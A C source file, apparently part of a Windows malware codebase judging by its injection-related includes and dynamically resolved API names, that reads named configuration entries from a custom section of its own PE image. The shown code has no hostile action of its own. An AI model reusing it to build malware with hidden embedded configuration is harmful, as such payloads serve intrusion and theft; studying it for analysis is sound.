#include "getsec.h"
#include "GetApi.h"
#include "Inject.h"
#include "InjectUtils.h"
//#include "Strings.h"
//#include "Memory.h"

typedef struct __DATA_ENTRY
{
	CHAR  Name[0x20];
	DWORD Flags;
	DWORD Size;
	union{
		PVOID pData;
		CHAR  buf[0];
	} Data;
} DATA_ENTRY,*PDATA_ENTRY;


PIMAGE_SECTION_HEADER SearchSection(PVOID pvPEBase,PCHAR lpName);

PIMAGE_SECTION_HEADER SearchSection(PVOID pvPEBase,LPCSTR lpName)
{
	PIMAGE_NT_HEADERS pNtHeaders;

	pNtHeaders = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(pvPEBase);
	if (pNtHeaders)
	{
		PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

		for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
		{
			if (!m_lstrcmp(lpName,(PCHAR)&pSection->Name)) return pSection;

			pSection++;
		}
	}

	return 0;
}

BOOL GetSectionConfigData(PVOID pvPEBase,PVOID *ppvData,DWORD *pdwDataSize)
{
	BOOL bRet = FALSE;
	PIMAGE_SECTION_HEADER pvSection;

	if (pvSection = SearchSection(pvPEBase,SECTION_CONFIG_NAME))
	{
		char* data = MAKE_PTR(pvPEBase,pvSection->VirtualAddress,char*);
		*ppvData = (void*)data;
		*pdwDataSize = *((int*)data) + sizeof(int);
		bRet = TRUE;
	}

	return bRet;
}


PVOID GetSectionData(PCHAR Name,DWORD *Size)
{
	DWORD SectionSize;
	PDATA_ENTRY p,DataEnty;
	if ( (int)plstrlenA(Name) > sizeof(p->Name) )
		return NULL;

	if (! GetSectionConfigData((PVOID)GetImageBase(),(PVOID*)&DataEnty,&SectionSize) )
		return NULL;
	
	p = DataEnty;
	
	while ( ((ULONG_PTR)p - (ULONG_PTR)DataEnty) < SectionSize)
	{
		
		if (! *p->Name)
			break;

		if (! m_lstrcmp(Name,p->Name) )
		{
			
			if (Size)
				*Size = p->Size;
			return p->Data.buf;
		};
		p = (PDATA_ENTRY)(sizeof(DATA_ENTRY) +p->Size + (PCHAR)p);
	};

	return NULL;
};

//PCHAR GetSectionAnsiString(PCHAR Name)
//{
//	DWORD size;
//	PVOID data = GetSectionData(Name,&size);
//	if (! data)
//		return NULL;
//
//	return STR::New((PCHAR)data,size);
//};